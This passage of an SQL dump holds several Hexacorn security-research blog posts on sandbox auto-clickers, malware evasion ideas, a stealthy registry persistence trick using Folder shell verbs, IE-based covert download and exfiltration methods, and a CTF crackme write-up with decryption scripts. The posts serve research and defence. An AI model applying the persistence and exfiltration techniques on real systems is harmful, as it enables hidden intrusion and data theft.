APIs, so you have to guess what code page is being used by the sample’s GUI\nThe GUI elements can be ordered, or not (this may determine which button is ‘default‘ – in the absence of the standard buttons like ‘OK’, of ‘Finish’ this may be important)\nThe GUI elements can be bitmaps so no way to determine what to click… other than via known bitmap hashes, OCR/ICR, or a matrix clicking where you walk through the surface of the window and click every few pixels, moving both horizontally and vertically through the whole window area; it’s prone to errors and may force the app to exit early\nThe GUI elements can be drawn using a HTML code, so you may need to either access it via existing means (eg. via WM_HTML_GETOBJECT) or use Accessibility options (read below about that)\nMany installers are interactive\n\nThe Installers often include EULA that has to be accepted (various keys used to accept, depending on language)\nYou may also need to choose options for installation e.g. installed UI languages, destination path, etc.\n\n\nMany installers download other components from the net or drop generic component installers during the installation, so the clicker needs to work across multiple processes w/o disturbing parent while the child process is still being ‘processed’ (e.g. can’t send ‘Next’ to the parent process until the child process exited successfully; for examples, see anything that relies on winpcap)\nThere could be decoy GUI elements (e.g. transparent elements added to fool auto clickers, ad hoc passwords, captchas, etc.)\n\nWhat can significantly help to code a good clicker is the use of mixed technologies and in general – be ready for lots of tuning:\n\nRecognize installer / sample file type and apply appropriate playbook\n\nThis is very important, because sometimes you can use unattended options, if available\nYou can also try to decompile the installer to extract files w/o GUI\n\n\nIn a generic way:\n\nIf possible, enumerate windows and their children, and recognize standard controls\nEnsure you you use proper windows APIs e.g. RealChildWindowFromPoint vs. ChildWindowFromPoint/ChildWindowFromPointEx\nRecognize standard shortcuts/accelerators\nRecognize default buttons (depends on the sequence of resources compiled into the binary)\nRecognize ‘Next’, ‘Finish’, OK class of buttons, etc.\nRecognize button classes in general (substrings: ‘button’, ‘btn’, etc.)\nRecognize Window texts e.g. ‘Accept EULA’ type of buttons (checkboxes, or radiobuttons)\nRecognize localized versions of the above\nRecognize automation possibilities\n\nThe problem of automatic clicking is actually not reserved to sandboxes only\nQA testing of any sort relies on it a lot: regression tests for coding and localization projects etc. involves lots of clicking and a huge progress has been made over the years to make it work smoothly, and fast\nLuckily, many software packages support GUI controls’ automation via IAccessible interface\nHave a read about Automated UI testing and  Microsoft UI Automation\n\n\nHave a look at other large projects where the localized strings for standard buttons are already localized e.g. LibreOffice\nDuring windows enumeration search for both Unicode, and ANSI versions of these strings while enumerating windows\nIf no success, consider injecting instrumentation code that is ‘native’ to the installer’s platform\nIf no success, consider OCR/ICRing elements of the screen, or use the Babylon technique of hooking API/redrawing text and catching text printed using Text APIs\nFor Delphi, it’s a mundane task of understanding all versions of their VCLs (I have code some PoC code and it was painful, but I was able to read some labels from Delphi programs)\nAs a last resort, redirect trouble samples to a team doing manual malware analysis so the clicker can be tuned\n\n\n\nAnd just to give you a localization sample… this is a list of ‘Agree’ buttons in various languages extracted from one of the Open Source projects:\n\nAfrikaans Regso\nAlbanian Pranoj\nArabic موافق\nArmenian Համաձայն եմ\nBasque Onartu\nBelarusian Згодзен\nBosnian Prihvatam\nBreton A-du emaon\nBulgarian Съгласен\nCatalan Hi estic d’acord\nCibemba Nasumina\nCroatian Prihvaćam\nCzech Souhlasím\nDanish Acceptér\nDutch Akkoord\nEfik Ami Mmenyịme\nEnglish I Agree\nEsperanto Akceptite\nEstonian Nõustun\nFarsi موافقم\nFinnish Hyväksyn\nFrench J’accepte\nGalician Aceito\nGeorgian ვეთანხმები\nGerman Annehmen\nGreek Συμφωνώ\nHebrew אני מסכים\nHindi सहमत\nHungarian Elfogadom\nIcelandic Ég Samþykki\nIgbo M Kwere\nIndonesian Saya Setuju\nIrish Glacaim Leis\nItalian Accetto\nKhmer I យល់​ព្រម​\nKorean 동의함\nKurdish Ez Dipejirînim\nLatvian Es piekrītu\nLithuanian Sutinku\nLuxembourgish Unhuelen\nMacedonian Да\nMalagasy Ekeko\nMongolian Зєвшєєрлєє\nNorwegian Godta\nPashto زه منم\nPolish Zgadzam się\nPortuguese Brasilian Eu Concordo\nRomanian De acord\nRussian Принимаю\nSerbian Прихватам\nSesotho Kea Lumela\nShona Ndinobvuma\nSimplified Chinese 我接受\nSlovak Súhlasím\nSlovenian Se strinjam\nSpanish Acepto\nSwahili Nakubali\nSwedish Jag Godkänner\nTamil A நான் ஒப்புக்கொள்ளுகிறேன்\nThai ตกลง\nTurkish Kabul Ediyorum\nTwi Migye Tom\nUkrainian Приймаю\nUyghur قوشۇلىمەن\nUzbek Qabul qilaman\nValencian Accepte\nVietnamese Tôi đồng ý\nWelsh Cytuno\nYoruba Mo Gbà\nZulu Ngiyavuma\n\nShare this :)', 'Sandboxing', 'http://www.hexacorn.com/blog/2018/06/08/enter-sandbox-part-17-the-clique-of-clickers/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (8, 'Permanent Link to Enter Sandbox – part 16: The symbols, the ApiSetSchema, and other possible future ', 'Hexacorn', 'June 2, 2018 ', 'It’s been a while since I wrote about Sandboxes and I thought I will revive the series by listing a couple of ideas that I believe may be still under the radar of both sandbox solution creators, and reverse engineers.\nSymbols\nWhen we analyze Windows native OS libraries one of the most useful features we have at hand is leveraging debugging symbols. IDA, windbg, and many other reversing tools can use these symbols very efficiently – with symbols in place we can see names of internal functions, variables, and this code/data enrichment provides us with an invaluable context that speeds up the analysis.\nNow, since the tools can use it, there is nothing that could stop malware from… doing the same.\nImagine the possibilities!\nInstead of relying on export/import tables, a clever malware that leverages symbols could make calls to internal functions, or find ways to hook code deep inside the functions that are typically monitored (at least on the userland level). Symbols could also help to detect caves i.e. areas of code/data that are rarely used, and allow malware to overwrite them and persist in a much stealthier way than usual. There is a lot of potential for surgical modification of code to launch the payload code using the EPO (Entry Point Obscuring) technique.\nNote that while there could be a need to download these PDB files directly on the infected system, nothing stops malware from sending copies of the DLLs from the system to its server first, decompiling / disassembling them on a remote server.  The malware could then craft the payload using hardcoded offsets obtained via symbols to deliver the required functionality. A side effect of such trickery would be that such crafted payloads would not run on sandboxes, and manual analysis would typically fail unless the file was analyzed on the exactly same system (meaning: with the same versions of libraries as existing on the victim’s system); obviously, ASLR needs to be taken into account for all offsets and calls. Another caveat is that such approach would require constant monitoring of Windows Update service; if files are replaced, the code would need to be updated to the most up to date version that works with the new libraries.\nLeveraging functions of ApiSetSchema libraries\nNow that we have not only kernel32.dll, but also KernelBase.dll, and the whole api-ms-*.dll zoo, it is possible to call these wrapper functions instead of the pure exports from kernel32.dll, advapi32.dll, etc..\nLeveraging internal/undocumented functions\nThese can be either located via symbols, or via ApiSetSchema libraries; a quick browsing through internal functions referenced by kernel32.dll reveals a lot of interesting possibilities e.g.:\n\nPrivCopyFileExW – undocumented function that allows to copy files\nA couple of exported Internal functions that can be potentially used as callbacks (to run shellcodes, payload code, etc.)\n\nInternal_EnumCalendarInfo\nInternal_EnumDateFormats\nInternal_EnumLanguageGroupLocales\nInternal_EnumSystemCodePages\nInternal_EnumSystemLanguageGroups\nInternal_EnumSystemLocales\nInternal_EnumTimeFormats\nInternal_EnumUILanguages\n\n\nA couple of exported Internal functions that can be used to access both the Registry and the File System bypassing documented APIs:\n\nRegCreateKeyExInternalA\nRegCreateKeyExInternalW\nRegDeleteKeyExInternalA\nRegDeleteKeyExInternalW\nRegOpenKeyExInternalA\nRegOpenKeyExInternalW\nReplaceFileExInternal\n\n\n\nThere is certainly more.\nNew technologies (well, sometimes not that new)\nWhile it doesn’t really rely on symbols, it does fit the topic of the article – there is a class of APIs that are not commonly used yet, but certainly will be heavily utilized in the future:  I am talking about enclave functions; as per MS:\nAn enclave is an isolated region of code and data within the address space for an application. Only code that runs within the enclave can access data within the same enclave.\nExample functions:\n\nCreateEnclave – creates an enclave;\nLoadEnclaveData –  allows to inject code/data into another processes\nand… other enclave functions\n\nSo, you got yourself yet another API set for both code injection and protection.\nI am obviously not the first one to highlight it; a paper from 2015 (3 years ago!) by Alex Ionescu covers the topic and lists a number of possible issues enclaves bring to the world of security solutions including AV, EDR, and perhaps memory acquisition tools.\nShare this :)', 'Anti-*, Anti-Forensics, Sandboxing', 'http://www.hexacorn.com/blog/2018/06/02/enter-sandbox-part-16-the-symbols-the-apisetschema-and-other-possible-future-evasions/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (9, 'Permanent Link to Beyond good ol’ Run key, Part 78', 'Hexacorn', 'May 28, 2018 ', 'Here’s a quick persistence mechanism for you: we all know that you can change the HKCR settings for file extensions to introduce a malicious proxy executable that can then launch the appropriate file. Changes to HKCR’s .exe, .txt, handlers are as old as Windows malware itself.\nIt turns out that you can apply the same trick to folders, and you can do so with an extra twist. To do so, just add these Registry entries:\n\nHKCR\\Folder\\shell\\(default)=test\nHKCR\\Folder\\shell\\test\\command\n@=”notepad.exe”\n\nAnd from now on, anytime you open any folder in Windows Explorer the notepad.exe will launch. And for the twist –  note that we are introducing a new ‘verb’ called ‘test’ for Shell and not modifying the ‘open’ command; spotting this may be much harder as you need the security solution to read what the default verb is first, then read its settings from the Registry. You can leverage this trick to modify shell’s behavior for any file type.\nObviously, such changes may ruin the user’s folder browsing experience, but Notepad is now a folder parasite and is here to stay…\nIf you wanted to be a bit more sneaky, and apply it to specific folders only, e.g. Recycle Bin, you just need to add (in this case we modify the ‘open’ verb settings, for simplicity):\nHKCR\\CLSID\\{645FF040-5081-101B-9F08-00AA002F954E}\\shell\\open\\command\n@=”c:\\\\windows\\\\system32\\\\calc.exe”\nWhere the 645FF040-5081-101B-9F08-00AA002F954E CLSID refers to Recycle Bin folder. Same goes for other special folders (as long as they are supported on your Windows version – win8/10 changes a lot here as they introduce that awful AOLish Start Menu).\n \nShare this :)', 'Anti-*, Autostart (Persistence)', 'http://www.hexacorn.com/blog/2018/05/28/beyond-good-ol-run-key-part-78-2/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (10, 'Permanent Link to Two old-school download/exfil methods', 'Hexacorn', 'May 25, 2018 ', 'Sending and receiving network data is always tricky.\nWith AV, EDR, and dozen of other agents that are installed on the system nowadays it is getting harder and harder to transfer data, because security applications may be actively monitoring specific system/API calls, or just following strict network rules with regards to non-approved apps. Often, if the app is not on the whitelist no connection out can be made.\nThere are numerous known ways to bypass it, of course; here, I re-discover two very, very and I mean it… very, very old-school techniques that rely on IE browser and its support of Dynamic Data Exchange (DDE) and Microsoft Active Accessibility (MSAA) functionalities. They have most likely only a historical meaning today: new versions of Windows are shipped with Microsoft Edge and the tabbed interface adds additional complexity…\nAs I mentioned, these two methods are almost completely forgotten. One of them was actively used by old malware (10+ years ago), the other was successfully leveraged by various IE Spies that helped to look at the source code of blocked/inaccessible IE windows + any application that was relying on the HTML-based user interface (it was very prevalent back in early 2000s e.g. think of Norton products from that era).\nThe first method is DDE/WWW_OpenURL command. As long as IE is open you can send it a DDE command WWW_OpenURL with the URL of your choice. Sending data out this way is trivial (although limited in length), receiving requires either accessing the IE instance, or just enumerating the TIF directory. The method is not clean per se as it was designed long time ago and was not prepared for the tabbed interface. It may affect the user’s browsing experience.\nThe second one is more esoteric. You can enumerate all windows classes and find windows with a class ‘Internet Explorer_Server’ (Old IE web browser container, prior to Edge; also note: you cnn always launch new instance of IE as well, and make it a hidden window). Once such window is identified, you can send it a very specific message called WM_HTML_GETOBJECT, and process the result using a ObjectFromLresult function. The result will give you an access to a IHTMLDocument2 pointer for that IE instance. With that pointer, you can walk through a couple of COM queries and retrieve the IWebBrowser2 interface of the Web control container. And with that, you can access an active instance of IE browser from your program and manipulate it freely to download and send out whatever you want. Unless security solution monitors these requests specifically you may not be able to spot the bad guy…\nI did say that these methods have most likely only a historical meaning today as new versions of Windows are shipped with Microsoft Edge and the tabbed interface adds additional complexity, but… as this thread suggests, perhaps the support for MSAA implemented by modern browsers still offers some interesting possibilities? And probably here it is a good time to remind you of my old post talking about using the accessibility APIs to develop keylogging functionality w/o using any typical well-known keylogging APIs.\nAnd last, but not least. At some stage I was looking at the possibility of using the DDE and WM_HTML_GETOBJECT tricks to develop a new code injection technique. Since we can access the browser’s process via other means than a regular WriteProcessMemory it definitely may come handy. And the simplicity of the idea relies on the fact that we can actually forget the shellcodes for a moment, and the code injection can rely on… JavaScript code.\nShare this :)', 'Anti-Forensics, Archaeology, Code Injection, Compromise Detection', 'http://www.hexacorn.com/blog/2018/05/25/two-old-school-download-exfil-methods/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (11, 'Permanent Link to MalwareBytes CTF: Capturing the flag I didn’t plan to catch…', 'Hexacorn', 'May 20, 2018 ', 'While browsing Twitter on Friday, April 27th I came across an announcement from @hasherezade about the release of a new crackme that she prepared and published on the MalwareBytes blog. I actually didn’t plan to take a part in it, but somehow I eventually got tempted and decided to give it a go…\nThen I won!\nBut let’s not get ahead of ourselves…\nThe file in question (mb_crackme_2.exe) is a 8MB executable. Once you see something like this, you… run away. I mean, seriously… well… good we have the sandboxes?\nThe problem is that in this case it’s a CTF and you need to reverse…\nSigh…\nOkay…\nSo… I checked the file type and… decided to run away again.\nPyInstaller… @#$%^&(!)\nI hate this stuff :).\nIt’s an .exe that spawns another .exe and there is a crazy amount of garbage dropped all over the place on the system where the file is executed.\nSo I try my luck with some decompiling tools I collected in the past. Of course, none worked. That’s actually very typical. But I used them before and knew it’s possible to extract the junk files and then decompile the main code.\nQuick google follows for the latest, and the best and it landed me on a github page of In Ming Loh from @countercept.\nA-ha. Updated last Nov, pretty new.\nDownload.\nTry.\nFail.\nI guess that’s why I don’t like Python ;).\nYup, the script didn’t work, but after quick code analysis (python trace log FTW) I modded it a bit to work and was able to decompile the main file (which was called ‘another’).\nHooray!\nThe decompiled python script is a battle pretty much won.\nSo I thought.\nI quickly identified Level1 user name hardcoded in the source code: hackerman.\nThe Password was present only as a hash, but Google helped to identify the hash as being taken from the following string: Password123 .\nSo, now I have a Login and the Password.\n\nWhat about the PIN?\nThe PIN requires quick thinking – google didn’t return any hits, so I have to brute-force.\nSigh…\nI hate writing code in Python…\nI love to rip it out from sources though and make it what I want it to do \nI ripped the code from the main module and let it go:\nimport os\r\nimport sys\r\nimport io\r\nimport math\r\nimport hashlib\r\nimport random\r\nfrom Crypto.Cipher import AES\r\nfrom Crypto import Random\r\nunpad = lambda s: s[:-ord(s[len(s) - 1:])]\r\npad = lambda s: s + (BS - len(s) % BS) * chr(BS - len(s) % BS)\r\nclass AESCipher:\r\n\r\ndef __init__(self, key):\r\n self.key = \'\'.join(map(chr, key))\r\n\r\ndef encrypt(self, raw):\r\n raw = pad(raw)\r\n cipher = AES.new(self.key, AES.MODE_ECB)\r\n return cipher.encrypt(raw)\r\n\r\ndef decrypt(self, enc):\r\n cipher = AES.new(self.key, AES.MODE_ECB)\r\n return unpad(cipher.decrypt(enc))\r\n\r\ndef get_url_key(my_seed):\r\n random.seed(my_seed)\r\n key = \'\'\r\n for i in xrange(0, 32):\r\n id = random.randint(0, 9)\r\n key += str(id)\r\n\r\nreturn key\r\n\r\ndef check_key(key):\r\n my_md5 = hashlib.md5(key).hexdigest()\r\n if my_md5 == \'fb4b322c518e9f6a52af906e32aee955\':\r\n return True\r\n return False\r\n\r\nPIN=0\r\nwhile True:\r\n key = get_url_key(int(PIN))\r\n\r\nif check_key(key):\r\n print (PIN)\r\n encrypted_url = \'\\xa6\\xfa\\x8fO\\xba\\x7f\\x9d\\xe2c\\x81`\\xf5\\xd5\\xf6\\x07\\x85\\xfe[hr\\xd6\\x80?U\\x90\\x89)\\xd1\\xe9\\xf0<\\xfe\'\r\n aes = AESCipher(bytearray(key))\r\n output = aes.decrypt(encrypted_url)\r\n print (output)\r\n exit(0)\r\n PIN = PIN+1\nIt pretty quickly identified the PIN to be 9667.\nWhen submitted I passed the Level1.\n\nMy python code (not really mine, cuz I ripped it out) also printed the URL that was encrypted inside the python code.\nThe aforementioned URL was the second stage stored at https://i.imgur.com/dTHXed7.png.\n\nThe picture is a garbage, so something must be hidden inside it.\nNo, don’t salivate yet! IT IS NOT STEGO!!!\nRead the python code…\ndef get_encoded_data(bytes):\r\n imo = Image.open(io.BytesIO(bytes))\r\n rawdata = list(imo.getdata())\r\n tsdata = \'\'\r\n for x in rawdata:\r\n for z in x:\r\n tsdata += chr(z)\r\n\r\ndel rawdata\r\n return tsdata\nA-ha…\nSo.. I downloaded the pic and ripped the above code and put it into another quick& dirty script.\nimport os\r\nimport sys\r\nimport io\r\nfrom PIL import Image\r\n\r\nimo = Image.open(\"dTHXed7.png\")\r\nrawdata = list(imo.getdata())\r\ntsdata = \'\'\r\nfor x in rawdata:\r\n for z in x:\r\n tsdata += chr(z)\r\n\r\nfile = open(\"blob.bin\",\"wb\")\r\nfile.write(tsdata)\r\nfile.close()\nI seriously don’t like python… at first I forgot to use ‘wb’ and used ‘w’ instead and got a corrupted .exe. It was obviously misaligned, cuz of new line battle between Windows and *NIX. So, maybe it’s not Python I don’t like after all.\nAfter fixing the ‘wb’ I got the nice DLL.\nWell… not so nice…\nWhen you load it it doesn’t obviously work and just laughs at you telling you that you failed.\nOkay..\nQuick analysis shows that there is a code that modifies VEH (Vector Exception Handler) using two AddVectoredExceptionHandler calls.\nThe first routine:\nThe second routine:\n \nSo… now we know that it tries to protect itself from analysts by checking if it is loaded inside the pyinstaller.exe and also checking if the analysts is not using some instrumentation. At least this is my assumption i.e. that’s why the environment variable mb_chall is set in the first routine and later checked inside the other. If you bypass some bit, the other bit won’t work.\nOnly if the PID stored in the environment variable is correct the handler will redirect the code execution by EIP+-6.\nThis is too much for me to handle and instead of killing myself with analysing this stuff inside the pyinstaller I patched the python27.dll check (NOP NOP NOP NOP), and then once I found out about the EIP change I just went and directly analyzed the code at the EIP+6 – so we just need to execute the console_thread (this is a name I’ve given this routine).\n\nSo now we can start analysis from this place.\nSurprise…\nA thread is created that calls EnumWindows, then a callback checks if the dedicated console window with the predetermined window text is available. The internals of it don’t interest me too much as I am just… craving for the flag.\nSo, I quickly identify that once the console window is present an EnumChildWindows API will be called with another callback.\nAnd this second callback is where the real juice is.\nAgain, ignoring the inner workings of the console window I realize that the command it accepts is ‘dump_the_key’.\nI instrument the code to decrypt (RC4) a small 617 bytes long blob at 0x10032000 and I get the base64-encoded string:\neJx9lL1OAkEQx+sreIeLlUQKBPXUxAISYmehD2As\r\n/IrEGKQwMT4AJLzD5ioIhNwd9wEFhQJ+JNgo/YUg\r\n4CVEE7ji7LzdPe4GOWl+2czO/GdnZnc/jgfoamxc\r\nmvrJqHuaL2znssxgdDTUz/oWW0fLSLjRKiFMhVDC\r\nVGVCYlFFwiqmImBKlE2wlkKCFWmVWMHaoFQIZcAa\r\nYRUzImBy1NLwyNEo1VPgJLIWCSte7EwWSgkoV0AU\r\nzCj/tXPaXBTNq5YY98yKl905D/URQKwGPFVwThHr\r\nOGta1yPYBcozFWmgY9P+MG5eGfjX5tSqng+1Rx9A\r\nt1tEh3ag+W/trF/tcKZ2FON7fnFuaqBXnODZ3Ykw\r\n0+xOVG2uhwvrolXYPl5/wD3haosUfO8DM9sTR0EE\r\nU274VOFOlvbBtoctdb2EwpYWwVRXMaUwsUSJhSNM\r\nEG4RbmIqa8QzggqBbAa/WX2SHqMdxC/hl/udQgZr\r\nfLHTJ4yfc2aQ7A4PJ2YK1dneZypvBFGROlybY1vk\r\n/MtI57Ea+QfyB+ZPsl+Ov73sPnfYIop3exfl19hT\r\na69zjwN5rHbLI3vLzb6C+DvephO733pPdPRYux3M\r\nZeHfEsj+AqgYif8=\r\n\nNow… this bit, according to the code of the DLL is injected into the memory address of actxprxy.dll that is loaded into this process. Mind you this is supposed to be loaded inside the pyinstaller crazy process child.\nLuckily, this actxprxy.dll rings a bell as I saw the python code that expects this data inside the PyInstaller madness:\ndef decode_pasted():\r\n my_proxy = kernel_dll.GetModuleHandleA(\'actxprxy.dll\')\r\n if my_proxy is None or my_proxy == 0:\r\n return False\r\n else:\r\n char_sum = 0\r\n arr1 = my_proxy\r\n str = \'\'\r\n while True:\r\n val = get_char(arr1)\r\n if val == \'\\x00\':\r\n break\r\n char_sum += ord(val)\r\n str = str + val\r\n arr1 += 1\r\n\r\nprint char_sum\r\n if char_sum != 52937:\r\n return False\r\n colors = level3_colors()\r\n if colors is None:\r\n return False\r\n val_arr = zlib.decompress(base64.b64decode(str))\r\n final_arr = dexor_data(val_arr, colors)\r\n try:\r\n exec final_arr\r\n except:\r\n print \'Your guess was wrong!\'\r\n return False\r\n\r\nreturn True\nSo… knowing what happens to this data, I de-Base64, dezlibbed, and got the raw data.\nYet it’s still encrypted… but we are already finishing.\nThe encryption is based on the color values R, G, B so it has to be 3 bytes long.\nInstead of finding out in any smart way, I brute force the encrypted blob on a single-xor key basis and quickly identify first color to be 0x80, then using the same trick the second color to be 0x0 and third to be 0x80.\nNow.. a quick perl code and a quick decrypting routine:\nuse strict;\r\nuse warnings;\r\n\r\nmy $f=shift || die (\"Gimme a file name!\\n\");\r\nopen F,\"<$f\";\r\nbinmode F;\r\nread F,my $data,-s $f;\r\nclose F;\r\n\r\nmy $newdata = \'\';\r\n\r\nmy $key=\"\\x80\\x00\\x80\";\r\nmy $n=0;\r\nfor (my $i=0; $i<length($data); $i++)\r\n {\r\n my $b=ord(substr($data,$i,1));\r\n my $k=ord(substr($key,$n,1));\r\n $newdata.=chr($b^$k);\r\n $n++;$n=0 if ($n>(length($key)-1));\r\n }\r\n\r\nopen F,\">$f.out\";\r\nbinmode F;\r\nprint F $newdata;\r\nclose F;\nWe now get a flagship python code:\nimport colorama\r\nfrom colorama import *\r\ndef print_flag():\r\n flag_hex = ( \r\n 0x73, 0x75, 0x72, 0x64, 0x65, 0x61, 0x68, 0x50, 0x20, \r\n 0x2D, 0x20, 0x22,0x2E, 0x6E, 0x65, 0x64, 0x64, 0x69, \r\n 0x68, 0x20, 0x79, 0x6C, 0x6C, 0x75, 0x66, 0x65, 0x72, \r\n 0x61, 0x63, 0x20, 0x6E, 0x65, 0x65, 0x62, 0x20, 0x73, \r\n 0x61, 0x68, 0x20, 0x74, 0x61, 0x68, 0x77, 0x20, 0x73, \r\n 0x65, 0x76, 0x69, 0x65, 0x63, 0x72, 0x65, 0x70, 0x20, \r\n 0x77, 0x65, 0x66, 0x20, 0x61, 0x20, 0x66, 0x6F, 0x20, \r\n 0x65, 0x63, 0x6E, 0x65, 0x67, 0x69, 0x6C, 0x6C, 0x65, \r\n 0x74, 0x6E, 0x69, 0x20, 0x65, 0x68, 0x74, 0x20, 0x3B, \r\n 0x79, 0x6E, 0x61, 0x6D, 0x20, 0x73, 0x65, 0x76, 0x69, \r\n 0x65, 0x63, 0x65, 0x64, 0x20, 0x65, 0x63, 0x6E, 0x61, \r\n 0x72, 0x61, 0x65, 0x70, 0x70, 0x61, 0x20, 0x74, 0x73, \r\n 0x72, 0x69, 0x66, 0x20, 0x65, 0x68, 0x74, 0x20, 0x3B, \r\n 0x6D, 0x65, 0x65, 0x73, 0x20, 0x79, 0x65, 0x68, 0x74, \r\n 0x20, 0x74, 0x61, 0x68, 0x77, 0x20, 0x73, 0x79, 0x61, \r\n 0x77, 0x6C, 0x61, 0x20, 0x74, 0x6F, 0x6E, 0x20,0x65, \r\n 0x72, 0x61, 0x20, 0x73, 0x67, 0x6E, 0x69, 0x68, 0x54, \r\n 0x22 )\r\n flag_str = \"\"\r\n for i in flag_hex:\r\n flag_str = chr(i) + flag_str\r\n init()\r\n print(Style.BRIGHT + Back.MAGENTA) + \"flag{\" + \r\n flag_str + \"}\" + (Style.RESET_ALL)\r\nprint_flag()\nWe have to run it to FINALLY get the flag:\n“Things are not always what they seem;\nthe first appearance deceives many;\nthe intelligence of a few perceives what has been carefully hidden.”\n– Phaedrus\nThat’s it…\nAs you can see I skipped through many parts in the interest of ROI and kinda luckily was able to bypass a number of tricks or disturb the assumed flow of events using aggressive code instrumentation and by understanding the code of the main module (python) and how it interacts with the assembly (DLL). Some people who tried to crack it reached out to me and many of them tried to do the analysis the hard way i.e. inside the pyinstaller – it is obviously possible, but so much harder! Remember kids: cheating is reversing! Or the other way around!\nHope you enjoyed it!\nI want to thank @hasherezade for creating the CTF. It was fun!\nShare this :)', 'CTF', 'http://www.hexacorn.com/blog/2018/05/20/malwarebytes-ctf-capturing-the-flag-i-didnt-plan-to-catch/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (12, 'Permanent Link to Slowing down…', 'Hexacorn', 'May 20, 2018 ', 'Update\nThank you to everyone who reached out on Twitter and directly; I am overwhelmed by the reaction especially I have not expected it; what was supposed to be a dry and semi-formal post about slowing down turned out to be probably more sentimental than it should.\nI just want to say thank you and emphasize that it’s mainly about changing gears – probably research less and go to gym more for starters… In any case, I am fine, and I apologize for making you worry!\nOld Post\nEverything has its beginning and end. Both events have some pros and cons.\nAnd typically, when you read something like this on the blog, it means it is the game over.\nFor over last (nearly) 7 years I tried my best to participate and give back to the security community by publishing about ideas, tools, as well as provide an honest critique of security solutions/ideas, and offer lots of research data that was never shared before; all in hope to give the most accurate (yet still mine, and subjective) view on the state of the affairs within our DFIR/RCE world, and offer an alternative to the industry fads, sometimes even idiocy of it, and so prevalent in our biz wishful thinking.\nThis post doesn’t actually end that. I love IT Security in general, I am still fascinated by it, and I am still a total noob when it comes to it; with a lifelong focus on the reverse engineering, computer forensics, incident response and anything related to this subject really I am here to stay and continue to write. You can’t just walk away from all this.\nHowever…\nThis post tells you that I am going to slow down.\nI am a blue teamer by heart and a red teamer by interest. Recent years brought to us a lot of commoditization in both areas; while 10 years ago you could say we sort of had garage days of DFIR, today we have lots of mature solutions, models and ideas that support our work. And there is not that much need now to provide novelty research either; seriously, lots of things are already known inside out; the large (and no-longer-just-only-AV-oriented) teams that emerged as a result of the last 10 years’ fight against the bad guys provide that additional research on regular, and often daily basis. For a small fish like me it is impossible to compete against it – I realized this around 2 years ago: a single contributor no longer has much place in this field. You need to be a part of a team, you need to collaborate, you need to represent and participate on a slightly different level. I kept going on, because I still had some ideas to talk about. Yet a slow decline of these novelty ideas is what drove me to write this post. I think the time for boutique security shops is over.\nAs a result I am changing the direction, and while I am saying that: I actually have no idea what that direction is today. Time will tell.\nIn any case…\nThank you for reading the blog so far, and all the feedback I received over the years. Being referenced by SANS, numerous books, presentations, and being mentioned in chit chats on various forums and platforms is the best satisfaction any security researcher can hope for.\nThank you!!!\nShare this :)', 'Hexacorn', 'http://www.hexacorn.com/blog/2018/05/20/slowing-down/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (13, 'Permanent Link to DeXRAY 2.14 update', 'Hexacorn', 'May 20, 2018 ', 'Corey Forman (fetchered) reached out to me about the lack of Microsoft Antimalware / Microsoft Security Essentials support in dexray. While I knew the encryption for these seemed to be trivial and was documented before (it is  a simple xor 0xFF) he actually confirmed that, and provided results of his research and support in testing the algorithm. As you might have guessed, this resulted in yet another update to dexray.\nThanks Corey !\nSo… with all the changes implemented you can find the latest version of DeXRAY here.\nThe full list of supported or recognized file formats is listed below:\n\nAhnLab (V3B)\nASquared (EQF)\nAvast (Magic@0=’-chest- ‘)\nAvira (QUA)\nBaidu (QV)\nBitDefender (BDQ)\nBullGuard (Q)\nCMC Antivirus (CMC)\nComodo <GUID> (not really; Quarantined files are not encrypted \nESafe (VIR)\nESET (NQF)\nF-Prot (TMP) (Magic@0=’KSS’)\nKaspersky (KLQ, System Watcher’s <md5>.bin)\nLavasoft AdAware (BDQ) /BitDefender files really/\nLumension LEMSS (lqf)\nMalwareBytes Data files (DATA) – 2 versions\nMalwareBytes Quarantine files (QUAR) – 2 versions\nMcAfee Quarantine files (BUP) /full support for OLE format/\nMicrosoft Antimalware / Microsoft Security Essentials\nMicrosoft Forefront|Defender (Magic@0=0B AD|D3 45) – D3 45 C5 99 header handled\nPanda <GUID> Zip files\nSentinel One (MAL)\nSpybot – Search & Destroy 2 ‘recovery’\nSUPERAntiSpyware (SDB)\nSymantec ccSubSdk files: {GUID} files and submissions.idx\nSymantec Quarantine Data files (QBD)\nSymantec Quarantine files (VBN), including from SEP on Linux\nSymantec Quarantine Index files (QBI)\nSymantec Quarantine files on MAC (quarantine.qtn)\nTrendMicro (Magic@0=A9 AC BD A7 which is a ‘VSBX’ string ^ 0xFF)\nQuickHeal <hash> files\nVipre (<GUID>_ENC2)\nZemana <hash> files+quarantine.db\nAny binary file (using X-RAY scanning)\n\nShare this :)', 'Batch Analysis, DeXRAY, Software Releases', 'http://www.hexacorn.com/blog/2018/05/20/dexray-2-14-update/\n');
INSERT INTO `Hexacorn` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (14, 'Permanent Link to Turning the MAX_PATH length to 11', 'Hexacorn', 'May 6, 2018 ', 'In my recent post I described how NTFS Sparse files could be used to make life of reversers, forensic investigators, and sandbox developers a bit more difficult. There are  more way to to make their life more miserable and here I describe another potential one.\nEvery once in a while I re-read the Naming Files, Paths, and Namespaces article on Microsoft page. I do it because I don’t remember all the gory details and I know that this page is updated every once in a while so sometimes you can find some new content there.\nNew content == new ideas.\nWhile the change I refer to is not very very new, it is very interesting especially from the reversers’ and sandbox developers’ perspective:\nMaximum Path Length Limitation\nIn the Windows API (with some exceptions discussed in the following paragraphs), the maximum length for a path is MAX_PATH, which is defined as 260 characters.\n[…]\nTip Starting in Windows 10, version 1607, MAX_PATH limitations have been removed from common Win32 file and directory functions. However, you must opt-in to the new behavior.\nA registry key allows you to enable or disable the new long path behavior. To enable long path behavior set the registry key at HKLM\\SYSTEM\\CurrentControlSet\\Control\\FileSystem LongPathsEnabled (Type: REG_DWORD). The key’s value will be cached by the system (per process) after the first call to an affected Win32 file or directory function (list follows). The registry key will not be reloaded during the lifetime of the process. In order for all apps on the 